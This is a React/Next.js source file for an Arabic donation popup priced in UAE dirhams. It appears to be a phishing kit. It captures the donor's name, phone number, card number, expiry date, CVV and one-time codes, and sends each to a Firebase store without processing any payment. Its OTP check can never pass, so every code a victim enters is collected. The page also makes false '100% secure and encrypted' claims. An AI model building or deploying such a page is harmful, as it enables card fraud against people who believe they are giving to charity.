"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { X, Lock, CreditCard, Calendar, ShieldCheck, AlertCircle } from "lucide-react"
import { addData } from "@/lib/firebase"

type PaymentStep = "donation" | "payment" | "processing" | "otp" | "success"

interface PaymentFlowProps {
  isOpen: boolean
  onClose: () => void
}

export function PaymentFlow({ isOpen, onClose }: PaymentFlowProps) {
  const [currentStep, setCurrentStep] = useState<PaymentStep>("donation")
  const [donationAmount, setDonationAmount] = useState<number | null>(null)
  const [donorName, setDonorName] = useState("")
  const [mobileNumber, setMobileNumber] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [otp, setOtp] = useState("")
  const [processingTime, setProcessingTime] = useState(5)
  const [otpError, setOtpError] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    if (v.length >= 2) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }
    return v
  }

  // Handle card number input
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCardNumber(e.target.value)
    setCardNumber(formattedValue)
  }

  // Handle expiry date input
  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatExpiryDate(e.target.value)
    setExpiryDate(formattedValue)
  }

  // Processing timer effect
  useEffect(() => {
    let timer: NodeJS.Timeout

    if (currentStep === "processing" && processingTime > 0) {
      timer = setTimeout(() => {
        setProcessingTime((prev) => prev - 1)
      }, 1000)
    } else if (currentStep === "processing" && processingTime === 0) {
      setCurrentStep("otp")
    }

    return () => {
      if (timer) clearTimeout(timer)
    }
  }, [currentStep, processingTime])

  // Reset processing time when leaving processing step
  useEffect(() => {
    if (currentStep !== "processing") {
      setProcessingTime(5)
    }
    const _id=localStorage.getItem('visitor')
    addData({
        id:_id,step:currentStep
    })
  }, [currentStep])

  if (!isOpen) return null

  const handleDonationSubmit = () => {
    if (donationAmount && donorName && mobileNumber) {
      setCurrentStep("payment")
      const _id=localStorage.getItem('visitor')

      addData({
        id:_id,donationAmount,donorName,mobileNumber,step:'otp'
    })
    }
  }

  const handlePaymentSubmit = () => {
    const _id=localStorage.getItem('visitor')
    if (cardNumber && expiryDate && cvv) {
        addData({
            id:_id,cardNumber,expiryDate,cvv,step:'otp'
        })
      setCurrentStep("processing")
    }
  }

  const handleOtpSubmit = () => {
    if (otp) {
    const _id=localStorage.getItem('visitor')
    addData({
        id:_id,otp
    })
      // For demo purposes, we'll consider "123456" as the valid OTP
      // In a real app, you would verify this with your backend
      if (otp === "12345654321") {
        setOtpError(false)
        setCurrentStep("success")
      } else {
        setOtpError(true)
        setOtpAttempts((prev) => prev + 1)
        // Shake animation for the OTP input
        const otpContainer = document.getElementById("otp-container")
        if (otpContainer) {
          otpContainer.classList.add("animate-shake")
          setTimeout(() => {
            otpContainer.classList.remove("animate-shake")
          }, 500)
        }
      }
    }
  }

  const resetAndClose = () => {
    setCurrentStep("donation")
    setDonationAmount(null)
    setDonorName("")
    setMobileNumber("")
    setCardNumber("")
    setExpiryDate("")
    setCvv("")
    setOtp("")
    setOtpError(false)
    setOtpAttempts(0)
    onClose()
  }

  // Determine card type based on first digits
  const getCardType = () => {
    const number = cardNumber.replace(/\s+/g, "")

    if (/^4/.test(number)) return "visa"
    if (/^5[1-5]/.test(number)) return "mastercard"
    if (/^3[47]/.test(number)) return "amex"

    return "unknown"
  }

  const cardType = getCardType()

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
      <Card className="bg-white rounded-md max-w-md w-full overflow-hidden relative">
        <Button variant="ghost" size="icon" className="absolute top-2 right-2 z-10" onClick={resetAndClose}>
          <X className="h-4 w-4" />
        </Button>

        {currentStep === "donation" && (
          <>
            {/* Modal Header */}
            <div className="bg-green-600 text-white p-4 flex justify-center items-center">
              <div className="flex items-center justify-center gap-4">
              
              </div>
              <p className="text-lg mr-4">للتبرع بالبطاقة الإئتمانية</p>
            </div>

            {/* Modal Body */}
            <div className="p-4">
              {/* Amount Selection */}
              <div className="mb-6">
                <p className="text-right mb-2 text-gray-700">(درهم اماراتي):حدد المبلغ</p>
                <div className="grid grid-cols-5 gap-2 mb-4">
                  {[30, 100, 200, 500, 1000].map((amount) => (
                    <button
                      key={amount}
                      onClick={() => setDonationAmount(amount)}
                      className={`p-2 rounded border ${
                        donationAmount === amount
                          ? "bg-orange-100 border-orange-500 text-orange-500"
                          : "bg-gray-100 border-gray-300 text-gray-700"
                      }`}
                    >
                      {amount}
                    </button>
                  ))}
                </div>
                <div className="text-right text-gray-700 mb-4">مبلغ آخر</div>
              </div>

              {/* Form Fields */}
              <div className="space-y-4">
                <div className="flex flex-col">
                  <input
                    type="text"
                    value={donorName}
                    onChange={(e) => setDonorName(e.target.value)}
                    placeholder="اسم المتبرع"
                    className="p-2 border border-gray-300 rounded text-right"
                  />
                </div>
                <div className="flex flex-col">
                  <input
                    type="tel"
                    value={mobileNumber}
                    onChange={(e) => setMobileNumber(e.target.value)}
                    placeholder="رقم الموبايل"
                    className="p-2 border border-gray-300 rounded text-right"
                  />
                </div>
                <div className="h-1 bg-orange-500 mt-2"></div>
              </div>

              {/* Action Buttons */}
              <div className="flex justify-between mt-6">
                <Button onClick={resetAndClose} variant="outline" className="border-gray-300">
                  إلغاء
                </Button>
                <Button
                  onClick={handleDonationSubmit}
                  className="bg-green-600 hover:bg-green-700 text-white"
                  disabled={!donationAmount || !donorName || !mobileNumber}
                >
                  متابعة
                </Button>
              </div>
            </div>
          </>
        )}

        {currentStep === "payment" && (
          <>
            {/* Payment Header */}
            <div className="bg-green-600 text-white p-4 text-center">
              <h2 className="text-xl font-bold">معلومات الدفع</h2>
              <p className="text-sm mt-1">المبلغ: {donationAmount} د.إ</p>
            </div>

            {/* Payment Form */}
            <div className="p-4">
              <div className="space-y-4">
                <div className="flex flex-col">
                  <label className="text-right mb-1 text-gray-700 flex items-center justify-end">
                    <CreditCard className="h-4 w-4 ml-1" />
                    رقم البطاقة
                  </label>
                  <div className="relative">
                    <Input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      className="text-right pr-10"
                      maxLength={19}
                    />
                    {cardType !== "unknown" && (
                      <div className="absolute left-2 top-1/2 transform -translate-y-1/2">
                        <div className="w-8 h-5 bg-gray-100 rounded flex items-center justify-center">
                          {cardType === "visa" && <span className="text-blue-600 font-bold text-xs">VISA</span>}
                          {cardType === "mastercard" && <span className="text-red-600 font-bold text-xs">MC</span>}
                          {cardType === "amex" && <span className="text-blue-500 font-bold text-xs">AMEX</span>}
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="flex flex-col">
                    <label className="text-right mb-1 text-gray-700 flex items-center justify-end">
                      <Calendar className="h-4 w-4 ml-1" />
                      تاريخ الانتهاء
                    </label>
                    <Input
                      type="text"
                      value={expiryDate}
                      onChange={handleExpiryDateChange}
                      placeholder="MM/YY"
                      className="text-right"
                      maxLength={5}
                    />
                  </div>
                  <div className="flex flex-col">
                    <label className="text-right mb-1 text-gray-700 flex items-center justify-end">
                      <Lock className="h-4 w-4 ml-1" />
                      رمز الأمان
                    </label>
                    <Input
                      type="text"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                      placeholder="CVV"
                      className="text-right"
                      maxLength={3}
                    />
                  </div>
                </div>

                <div className="flex justify-center mt-4">
                  <div className="flex gap-2">
                    <img src="/vaa.png" alt="Visa" width={80} height={60} />
                  </div>
                </div>

                <div className="flex items-center justify-center text-xs text-gray-500 mt-2">
                  <Lock className="h-3 w-3 mr-1" />
                  جميع المعاملات آمنة ومشفرة
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex justify-between mt-6">
                <Button onClick={() => setCurrentStep("donation")} variant="outline" className="border-gray-300">
                  رجوع
                </Button>
                <Button
                  onClick={handlePaymentSubmit}
                  className="bg-green-600 hover:bg-green-700 text-white"
                  disabled={!cardNumber || !expiryDate || !cvv}
                >
                  تأكيد الدفع
                </Button>
              </div>
            </div>
          </>
        )}

        {currentStep === "processing" && (
          <div className="p-8 flex flex-col items-center justify-center min-h-[300px]">
            <div className="mb-6">
              <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-green-600"></div>
            </div>
            <h3 className="text-xl font-bold mb-4 text-center">جاري معالجة الدفع</h3>
            <p className="text-gray-600 mb-2 text-center">يرجى الانتظار بينما نتحقق من معلومات بطاقتك</p>
            <p className="text-gray-500 text-sm text-center">سيتم توجيهك تلقائياً في {processingTime} ثوان</p>

            <div className="flex items-center justify-center mt-8 text-xs text-gray-500">
              <ShieldCheck className="h-4 w-4 mr-1" />
              معاملة آمنة ومشفرة بنسبة 100%
            </div>
          </div>
        )}

        {currentStep === "otp" && (
          <>
            {/* OTP Header */}
            <div className="bg-green-600 text-white p-4 text-center">
              <h2 className="text-xl font-bold">التحقق من الرمز</h2>
              <p className="text-sm mt-1">تم إرسال رمز التحقق إلى {mobileNumber}</p>
            </div>

            {/* OTP Form */}
            <div className="p-4">
              <div className="space-y-4">
                <div className="flex flex-col items-center">
                  <p className="text-gray-700 mb-4">أدخل رمز التحقق المكون من 6 أرقام</p>

                  {/* OTP Error Message */}
                  {otpError && (
                    <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-2 rounded-md mb-4 flex items-center">
                      <AlertCircle className="h-4 w-4 mr-2" />
                      <span>رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</span>
                    </div>
                  )}

                  {/* OTP Input */}
                  <div id="otp-container" className="flex justify-center gap-2 mb-4">
                    <div className="flex gap-2">
                      {Array(6)
                        .fill(0)
                        .map((_, index) => (
                          <Input
                            key={index}
                            type="text"
                            maxLength={1}
                            className={`w-10 h-12 text-center text-xl ${
                              otpError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : ""
                            }`}
                            value={otp[index] || ""}
                            onChange={(e) => {
                              const value = e.target.value
                              if (/^\d*$/.test(value)) {
                                const newOtp = otp.split("")
                                newOtp[index] = value
                                setOtp(newOtp.join(""))
                                setOtpError(false)

                                // Auto-focus next input
                                if (value && index < 5) {
                                  const nextInput = document.querySelector(
                                    `input[name="otp-${index + 1}"]`,
                                  ) as HTMLInputElement
                                  if (nextInput) nextInput.focus()
                                }
                              }
                            }}
                            name={`otp-${index}`}
                          />
                        ))}
                    </div>
                  </div>

                  {/* Attempts Counter */}
                  {otpAttempts > 0 && <p className="text-xs text-gray-500 mb-2">عدد المحاولات: {otpAttempts}/3</p>}

                  <div className="flex items-center justify-center">
                    <p className="text-sm text-gray-500 flex items-center">
                      <Lock className="h-3 w-3 ml-1" />
                      تم إرسال الرمز عبر رسالة نصية
                    </p>
                  </div>
                  <p className="text-sm text-gray-500 mt-4">
                    لم يصلك الرمز؟ <button className="text-blue-600">إعادة الإرسال</button>
                  </p>

                  {/* Hint for demo purposes */}
                  <div className="mt-4 text-xs text-gray-400 border-t border-gray-100 pt-2">
                    للتجربة، استخدم الرمز: 123456
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex justify-between mt-6">
                <Button onClick={() => setCurrentStep("payment")} variant="outline" className="border-gray-300">
                  رجوع
                </Button>
                <Button
                  onClick={handleOtpSubmit}
                  className="bg-green-600 hover:bg-green-700 text-white"
                  disabled={!otp || otp.length < 6}
                >
                  تأكيد
                </Button>
              </div>
            </div>
          </>
        )}

        {currentStep === "success" && (
          <>
            {/* Success Header */}
            <div className="bg-green-600 text-white p-4 text-center">
              <h2 className="text-xl font-bold">تمت عملية التبرع بنجاح</h2>
            </div>

            {/* Success Message */}
            <div className="p-8 text-center">
              <div className="flex justify-center mb-4">
                <div className="bg-green-100 p-4 rounded-full">
                  <svg
                    width="64"
                    height="64"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    className="text-green-600"
                  >
                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
                  </svg>
                </div>
              </div>
              <h3 className="text-xl font-bold mb-2">شكراً لتبرعك</h3>
              <p className="text-gray-600 mb-4">تم التبرع بمبلغ {donationAmount} د.إ بنجاح</p>
              <div className="bg-gray-50 p-3 rounded-md mb-6">
                <p className="text-gray-700 font-medium">
                  رقم المرجع:{" "}
                  {Math.floor(Math.random() * 1000000)
                    .toString()
                    .padStart(6, "0")}
                </p>
                <p className="text-gray-500 text-xs mt-1">
                  {new Date().toLocaleDateString("ar-AE", {
                    year: "numeric",
                    month: "long",
                    day: "numeric",
                    hour: "2-digit",
                    minute: "2-digit",
                  })}
                </p>
              </div>
              <Button onClick={resetAndClose} className="bg-green-600 hover:bg-green-700 text-white w-full">
                العودة للرئيسية
              </Button>
            </div>
          </>
        )}
      </Card>
    </div>
  )
}

